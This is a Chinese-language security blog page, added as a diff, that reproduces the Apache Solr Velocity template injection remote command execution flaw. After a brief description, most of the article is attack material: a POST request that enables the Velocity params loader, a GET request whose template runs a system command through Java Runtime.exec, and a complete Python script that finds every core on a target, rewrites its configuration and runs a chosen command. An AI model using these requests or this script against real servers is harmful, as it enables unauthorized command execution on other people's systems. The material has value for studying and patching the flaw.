@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apache Solr Velocity模版注入远程命令执行一、漏洞简介该漏洞的产生是由于两方面的原因： 1、当攻击者可以直接访问Solr控制台时，可以通过发送类似&#x2F;节点名&#x2F;config的POST请求对该节点的配置文件做更改。2、2ApacheSolr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Apache Solr Velocity模版注入远程命令执行一、漏洞简介该漏洞的产生是由于两方面的原因： 1、当攻击者可以直接访问Solr控制台时，可以通过发送类似&#x2F;节点名&#x2F;config的POST请求对该节点的配置文件做更改。2、2ApacheSolr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApacheSolrVelocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+<meta property="article:published_time" content="2022-07-08T06:25:52.828Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/ApacheSolrVelocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Apache Solr/Apache Solr Velocity模版注入远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.828Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Solr-Velocity模版注入远程命令执行"><a href="#Apache-Solr-Velocity模版注入远程命令执行" class="headerlink" title="Apache Solr Velocity模版注入远程命令执行"></a>Apache Solr Velocity模版注入远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞的产生是由于两方面的原因：</p>
+<p>1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。2、2Apache<br>Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置paramsresource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。</p>
+<p>推测影响全版本Apache Solr。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="手动检测"><a href="#手动检测" class="headerlink" title="手动检测"></a>手动检测</h3><p>手动检测访问<a target="_blank" rel="noopener" href="http://www.0-sec.org/8983/solr//#/%E8%BF%9B%E5%85%A5%E4%B8%BB%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8D%95%E5%87%BB%E5%B7%A6%E4%BE%A7%E7%9A%84Core">http://www.0-sec.org/8983/solr/\#/进入主界面，单击左侧的Core</a><br>Selector查看集合名称</p>
+<p><img src="/resource/ApacheSolrVelocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png"></p>
+<h4 id="1、post发送请求"><a href="#1、post发送请求" class="headerlink" title="1、post发送请求"></a>1、post发送请求</h4><pre><code>POST /solr/test/config HTTP/1.1
+Host: solr:8983
+Content-Type: application/json
+Content-Length: 259
+
+&#123;
+  &quot;update-queryresponsewriter&quot;: &#123;
+    &quot;startup&quot;: &quot;lazy&quot;,
+    &quot;name&quot;: &quot;velocity&quot;,
+    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+    &quot;template.base.dir&quot;: &quot;&quot;,
+    &quot;solrresource.loader.enabled&quot;: &quot;true&quot;,
+    &quot;paramsresource.loader.enabled&quot;: &quot;true&quot;
+  &#125;
+&#125;
+</code></pre>
+<h4 id="2、执行系统命令"><a href="#2、执行系统命令" class="headerlink" title="2、执行系统命令"></a>2、执行系统命令</h4><pre><code>GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
+Host: localhost:8983
+</code></pre>
+<h3 id="使用脚本检测"><a href="#使用脚本检测" class="headerlink" title="使用脚本检测"></a>使用脚本检测</h3><pre><code>auth: @l3_W0ng
+version: 1.0
+function: Apache Solr RCE via Velocity template
+usage: python3 script.py ip [port [command]]
+               default port=8983
+               default command=whoami
+note:
+Step1: Init Apache Solr Configuration
+Step2: Remote Exec in Every Solr Node
+&quot;&quot;&quot;
+
+
+import sys
+import json
+import time
+import requests
+
+
+class initSolr(object):
+
+    timestamp_s = str(time.time()).split(&#39;.&#39;)
+    timestamp = timestamp_s[0] + timestamp_s[1][0:-3]
+
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+
+    def get_nodes(self):
+        payload = &#123;
+            &#39;_&#39;: self.timestamp,
+            &#39;indexInfo&#39;: &#39;false&#39;,
+            &#39;wt&#39;: &#39;json&#39;
+        &#125;
+        url = &#39;http://&#39; + self.ip + &#39;:&#39; + self.port + &#39;/solr/admin/cores&#39;
+
+        try:
+            nodes_info = requests.get(url, params=payload, timeout=5)
+            node = list(nodes_info.json()[&#39;status&#39;].keys())
+            state = 1
+        except:
+            node = &#39;&#39;
+            state = 0
+
+        if node:
+            return &#123;
+                &#39;node&#39;: node,
+                &#39;state&#39;: state,
+                &#39;msg&#39;: &#39;Get Nodes Successfully&#39;
+            &#125;
+        else:
+            return &#123;
+                &#39;node&#39;: None,
+                &#39;state&#39;: state,
+                &#39;msg&#39;: &#39;Get Nodes Failed&#39;
+            &#125;
+
+    def get_system(self):
+        payload = &#123;
+            &#39;_&#39;: self.timestamp,
+            &#39;wt&#39;: &#39;json&#39;
+        &#125;
+        url = &#39;http://&#39; + self.ip + &#39;:&#39; + self.port + &#39;/solr/admin/info/system&#39;
+        try:
+            system_info = requests.get(url=url, params=payload, timeout=5)
+            os_name = system_info.json()[&#39;system&#39;][&#39;name&#39;]
+            os_uname = system_info.json()[&#39;system&#39;][&#39;uname&#39;]
+            os_version = system_info.json()[&#39;system&#39;][&#39;version&#39;]
+            state = 1
+
+        except:
+            os_name = &#39;&#39;
+            os_uname = &#39;&#39;
+            os_version = &#39;&#39;
+            state = 0
+
+        return &#123;
+            &#39;system&#39;: &#123;
+                &#39;name&#39;: os_name,
+                &#39;uname&#39;: os_uname,
+                &#39;version&#39;: os_version,
+                &#39;state&#39;: state
+            &#125;
+        &#125;
+
+
+class apacheSolrRCE(object):
+
+    def __init__(self, ip, port, node, command):
+        self.ip = ip
+        self.port = port
+        self.node = node
+        self.command = command
+        self.url = &quot;http://&quot; + self.ip + &#39;:&#39; + self.port + &#39;/solr/&#39; + self.node
+
+    def init_node_config(self):
+        url = self.url + &#39;/config&#39;
+        payload = &#123;
+            &#39;update-queryresponsewriter&#39;: &#123;
+                &#39;startup&#39;: &#39;lazy&#39;,
+                &#39;name&#39;: &#39;velocity&#39;,
+                &#39;class&#39;: &#39;solr.VelocityResponseWriter&#39;,
+                &#39;template.base.dir&#39;: &#39;&#39;,
+                &#39;solrresource.loader.enabled&#39;: &#39;true&#39;,
+                &#39;paramsresource.loader.enabled&#39;: &#39;true&#39;
+            &#125;
+        &#125;
+        try:
+            res = requests.post(url=url, data=json.dumps(payload), timeout=5)
+            if res.status_code == 200:
+                return &#123;
+                    &#39;init&#39;: &#39;Init node config successfully&#39;,
+                    &#39;state&#39;: 1
+                &#125;
+            else:
+                return &#123;
+                    &#39;init&#39;: &#39;Init node config failed&#39;,
+                    &#39;state&#39;: 0
+                &#125;
+        except:
+            return &#123;
+                &#39;init&#39;: &#39;Init node config failed&#39;,
+                &#39;state&#39;: 0
+            &#125;
+
+    def rce(self):
+        url = self.url + (&quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=&quot;
+                          &quot;%23set($x=%27%27)+&quot;
+                          &quot;%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+&quot;
+                          &quot;%23set($chr=$x.class.forName(%27java.lang.Character%27))+&quot;
+                          &quot;%23set($str=$x.class.forName(%27java.lang.String%27))+&quot;
+                          &quot;%23set($ex=$rt.getRuntime().exec(%27&quot; + self.command +
+                          &quot;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+&quot;
+                          &quot;%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;)
+        try:
+            res = requests.get(url=url, timeout=5)
+            if res.status_code == 200:
+                try:
+                    if res.json()[&#39;responseHeader&#39;][&#39;status&#39;] == &#39;0&#39;:
+                        return &#39;RCE failed @Apache Solr node %s\n&#39; % self.node
+                    else:
+                        return &#39;RCE failed @Apache Solr node %s\n&#39; % self.node
+                except:
+                    return &#39;RCE Successfully @Apache Solr node %s\n %s\n&#39; % (self.node, res.text.strip().strip(&#39;0&#39;))
+
+            else:
+                return &#39;RCE failed @Apache Solr node %s\n&#39; % self.node
+        except:
+            return &#39;RCE failed @Apache Solr node %s\n&#39; % self.node
+
+
+def check(ip, port=&#39;8983&#39;, command=&#39;whoami&#39;):
+    system = initSolr(ip=ip, port=port)
+    if system.get_nodes()[&#39;state&#39;] == 0:
+        print(&#39;No Nodes Found. Remote Exec Failed!&#39;)
+    else:
+        nodes = system.get_nodes()[&#39;node&#39;]
+        systeminfo = system.get_system()
+        os_name = systeminfo[&#39;system&#39;][&#39;name&#39;]
+        os_version = systeminfo[&#39;system&#39;][&#39;version&#39;]
+        print(&#39;OS Realese: %s, OS Version: %s\nif remote exec failed, &#39;
+              &#39;you should change your command with right os platform\n&#39; % (os_name, os_version))
+
+        for node in nodes:
+            res = apacheSolrRCE(ip=ip, port=port, node=node, command=command)
+            init_node_config = res.init_node_config()
+            if init_node_config[&#39;state&#39;] == 1:
+                print(&#39;Init node %s Successfully, exec command=%s&#39; % (node, command))
+                result = res.rce()
+                print(result)
+            else:
+                print(&#39;Init node %s Failed, Remote Exec Failed\n&#39; % node)
+
+
+if __name__ == &#39;__main__&#39;:
+    usage = (&#39;python3 script.py ip [port [command]]\n &#39;
+             &#39;\t\tdefault port=8983\n &#39;
+             &#39;\t\tdefault command=whoami&#39;)
+
+    if len(sys.argv) == 4:
+        ip = sys.argv[1]
+        port = sys.argv[2]
+        command = sys.argv[3]
+        check(ip=ip, port=port, command=command)
+    elif len(sys.argv) == 3:
+        ip = sys.argv[1]
+        port = sys.argv[2]
+        check(ip=ip, port=port)
+    elif len(sys.argv) == 2:
+        ip = sys.argv[1]
+        check(ip=ip)
+    else:
+        print(&#39;Usage: %s:\n&#39; % usage)
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qmfk001vy8v12amk3j89" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
